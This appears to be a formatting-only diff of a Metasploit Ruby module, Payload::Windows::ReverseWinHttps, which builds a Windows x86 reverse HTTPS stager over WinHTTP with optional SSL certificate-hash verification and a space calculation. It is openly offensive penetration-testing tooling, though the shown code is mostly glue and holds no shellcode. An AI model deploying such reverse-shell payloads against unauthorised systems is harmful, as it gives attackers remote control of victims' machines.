@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 # -*- coding: binary -*-
 
 require 'msf/core'
@@ -7,66 +8,58 @@ require 'msf/core/payload/windows/verify_ssl'
 require 'rex/payloads/meterpreter/uri_checksum'
 
 module Msf
-
-###
-#
-# Complex payload generation for Windows ARCH_X86 that speak HTTPS using WinHTTP
-#
-###
-
-module Payload::Windows::ReverseWinHttps
-
-  include Msf::Payload::TransportConfig
-  include Msf::Payload::Windows::ReverseWinHttp
-  include Msf::Payload::Windows::VerifySsl
-
+  ###
   #
-  # Register reverse_winhttps specific options
+  # Complex payload generation for Windows ARCH_X86 that speak HTTPS using WinHTTP
   #
-  def initialize(*args)
-    super
+  ###
 
-    register_advanced_options([
-        OptBool.new('StagerVerifySSLCert', [false, 'Whether to verify the SSL certificate hash in the handler', false])
-      ], self.class)
-  end
+  module Payload::Windows::ReverseWinHttps
+    include Msf::Payload::TransportConfig
+    include Msf::Payload::Windows::ReverseWinHttp
+    include Msf::Payload::Windows::VerifySsl
 
-  #
-  # Generate the first stage
-  #
-  def generate
+    #
+    # Register reverse_winhttps specific options
+    #
+    def initialize(*args)
+      super
 
-    verify_cert_hash = get_ssl_cert_hash(datastore['StagerVerifySSLCert'],
-                                         datastore['HandlerSSLCert'])
-
-    super(
-      ssl:              true,
-      verify_cert_hash: verify_cert_hash
-    )
-  end
-
-  def transport_config(opts={})
-    transport_config_reverse_https(opts)
-  end
-
-  #
-  # Determine the maximum amount of space required for the features requested
-  #
-  def required_space
-    space = super
-
-    # SSL support adds 20 bytes
-    space += 20
-
-    # SSL verification adds 120 bytes
-    if datastore['StagerVerifySSLCert']
-      space += 120
+      register_advanced_options([
+                                  OptBool.new('StagerVerifySSLCert', [false, 'Whether to verify the SSL certificate hash in the handler', false])
+                                ], self.class)
     end
 
-    space
+    #
+    # Generate the first stage
+    #
+    def generate
+      verify_cert_hash = get_ssl_cert_hash(datastore['StagerVerifySSLCert'],
+                                           datastore['HandlerSSLCert'])
+
+      super(
+        ssl:              true,
+        verify_cert_hash: verify_cert_hash
+      )
+    end
+
+    def transport_config(opts = {})
+      transport_config_reverse_https(opts)
+    end
+
+    #
+    # Determine the maximum amount of space required for the features requested
+    #
+    def required_space
+      space = super
+
+      # SSL support adds 20 bytes
+      space += 20
+
+      # SSL verification adds 120 bytes
+      space += 120 if datastore['StagerVerifySSLCert']
+
+      space
+    end
   end
-
 end
-
-end
-
